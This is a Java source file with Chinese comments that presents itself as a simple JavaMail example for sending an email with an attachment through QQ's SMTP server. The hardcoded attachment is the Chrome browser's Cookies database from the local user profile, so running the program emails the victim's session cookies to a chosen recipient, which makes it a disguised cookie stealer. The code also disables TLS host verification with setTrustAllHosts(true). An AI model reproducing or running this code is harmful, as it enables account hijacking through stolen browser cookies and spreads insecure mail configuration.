import com.sun.mail.util.MailSSLSocketFactory;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.*;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import java.security.GeneralSecurityException;
import java.util.Properties;

/*
 * 需要导入依赖：
<dependency>
	<groupId>com.sun.mail</groupId>
	<artifactId>javax.mail</artifactId>
	<version>1.6.2</version>
</dependency>
<dependency>
	<groupId>javax.activation</groupId>
	<artifactId>activation</artifactId>
	<version>1.1.1</version>
</dependency>
 */

public class Main {

    public static void main(String[] args) throws GeneralSecurityException {
        Main main = new Main();
        main.sendEmail("标题", "内容", "收件人");
    }

    public void sendEmail(String title, String content, String to) throws GeneralSecurityException {
        String from = "xxxxxx@qq.com";
        String host = "smtp.qq.com";
        Properties properties = System.getProperties();
        properties.setProperty("mail.smtp.host", host);
        properties.put("mail.smtp.auth", "true");
        MailSSLSocketFactory sf = new MailSSLSocketFactory();
        sf.setTrustAllHosts(true);
        properties.put("mail.smtp.ssl.enable", "true");
        properties.put("mail.smtp.ssl.socketFactory", sf);
        Session session = Session.getDefaultInstance(properties, new Authenticator() {
            @Override
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("xxxxxxx@qq.com", "*********");
            }
        });
        try {

            // 创建默认的 MimeMessage 对象。
            MimeMessage message = new MimeMessage(session);
            // Set From: 头部头字段
            message.setFrom(new InternetAddress(from));
            // Set To: 头部头字段
            message.addRecipient(Message.RecipientType.TO,
                    new InternetAddress(to));
            // Set Subject: 头字段
            message.setSubject(title);
            // 创建消息部分
            BodyPart messageBodyPart = new MimeBodyPart();
            // 消息
            messageBodyPart.setText(content);
            // 创建多重消息
            Multipart multipart = new MimeMultipart();
            // 设置文本消息部分
            multipart.addBodyPart(messageBodyPart);
            // 附件部分
            messageBodyPart = new MimeBodyPart();
            String filename = "C:\\Users\\think\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
            DataSource source = new FileDataSource(filename);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(filename);
            multipart.addBodyPart(messageBodyPart);
            // 发送完整消息
            message.setContent(multipart );
            //   发送消息
            Transport.send(message);
            System.out.println("Sent message successfully....");
            System.out.println("邮件发送成功");
        }catch (MessagingException mex){
            mex.printStackTrace();
        }
    }
}
